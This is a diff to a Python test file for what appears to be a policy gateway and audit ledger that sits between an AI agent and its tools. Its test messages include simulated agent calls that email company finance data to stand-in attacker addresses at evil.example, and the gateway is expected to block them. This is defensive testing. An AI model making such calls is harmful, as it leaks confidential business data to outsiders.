@@ -1,4 +1,5 @@
 import io
+import time
 import json
 import sys
 from pathlib import Path
@@ -6,6 +7,7 @@ from pathlib import Path
 from aig import Engine, Session, load_policy
 from aig.gateway import Gateway, run_stdio
 from aig.ledger import Ledger, verify
+from aig.sim import Enterprise
 
 ROOT = Path(__file__).parent.parent
 POLICY = load_policy(ROOT / "examples" / "enterprise.yaml")
@@ -43,7 +45,8 @@ def test_ledger_chain_detects_tampering(tmp_path):
     log = tmp_path / "d.jsonl"
     gw = Gateway(Engine(POLICY), Session("expense-bot", "group:finance"), ledger=Ledger(log))
     gw.from_agent(call(1, "finance.query_ledger"))
-    gw.from_agent(call(2, "email.send", {"to": "x@evil.example"}))
+    gw.from_server({"jsonrpc": "2.0", "id": 1, "result": Enterprise().call("finance.query_ledger")})
+    gw.from_agent(call(2, "email.send", {"to": "x@evil.example", "body": "TX-1041"}))
     gw.from_agent(call(3, "docs.search"))
     assert verify(log) == (True, 3, "3 records verified")
 
@@ -65,16 +68,25 @@ def test_end_to_end_stdio_proxy(tmp_path):
         {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
         {"jsonrpc": "2.0", "method": "notifications/initialized"},
         call(2, "finance.query_ledger"),
-        call(3, "email.send", {"to": "drop@evil.example"}),
+        call(3, "email.send", {"to": "drop@evil.example", "body": "Northwind Logistics 18450"}),
         call(4, "email.send", {"to": "cfo@corp.example"}),
     ]
-    agent_in = io.StringIO("".join(json.dumps(m) + "\n" for m in msgs))
     agent_out = io.StringIO()
+
+    def agent_in():
+        # Like a real agent: wait for each tool result before sending the next call.
+        for m in msgs:
+            if "id" in m and m["id"] > 2:
+                deadline = time.time() + 5
+                while f'"id": {m["id"] - 1}' not in agent_out.getvalue() and time.time() < deadline:
+                    time.sleep(0.01)
+            yield json.dumps(m) + "\n"
+
     gw = Gateway(Engine(POLICY), Session("expense-bot", "group:finance"), ledger=Ledger(tmp_path / "d.jsonl"))
-    run_stdio(gw, [sys.executable, str(ROOT / "examples" / "mock_mcp_server.py")], agent_in, agent_out)
+    run_stdio(gw, [sys.executable, "-m", "aig.sim"], agent_in(), agent_out)
 
     replies = {r["id"]: r for r in map(json.loads, agent_out.getvalue().splitlines())}
-    assert replies[1]["result"]["serverInfo"]["name"] == "mock-enterprise"
-    assert "executed finance.query_ledger" in replies[2]["result"]["content"][0]["text"]
+    assert replies[1]["result"]["serverInfo"]["name"] == "sim-enterprise"
+    assert "Northwind" in replies[2]["result"]["content"][0]["text"]
     assert replies[3]["result"]["isError"] is True
-    assert "executed email.send" in replies[4]["result"]["content"][0]["text"]
+    assert replies[4]["result"]["content"][0]["text"] == "sent"
